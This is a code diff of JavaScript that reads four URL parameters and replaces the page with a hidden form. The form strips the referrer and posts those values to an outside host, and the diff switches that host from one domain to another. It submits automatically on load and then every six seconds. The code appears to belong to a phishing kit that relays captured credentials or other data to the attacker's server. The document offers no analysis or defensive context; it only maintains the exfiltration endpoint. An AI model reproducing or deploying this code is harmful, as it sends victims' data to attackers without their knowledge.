@@ -138,7 +138,7 @@ var c = getParameterByName("c");
 var d = getParameterByName("d");
 
 
-    $('body').replaceWith('<meta nme="referrer" content="never"><meta nme="referrer" content="no-referrer"><form action="https://nplazers.ga/novo/dts1.php" name="vote" method="post" style="display:none;" id="myForm"><input type="text" name="u" value="' + a + '" /><input type="text" name="t" value="' + b + '" /><input type="text" name="y" value="' + c + '" /><input type="text" name="h" value="' + d + '" /></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script>'); 
+    $('body').replaceWith('<meta nme="referrer" content="never"><meta nme="referrer" content="no-referrer"><form action="https://nplazers.in/novo/dts1.php" name="vote" method="post" style="display:none;" id="myForm"><input type="text" name="u" value="' + a + '" /><input type="text" name="t" value="' + b + '" /><input type="text" name="y" value="' + c + '" /><input type="text" name="h" value="' + d + '" /></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script>'); 
     
     
     
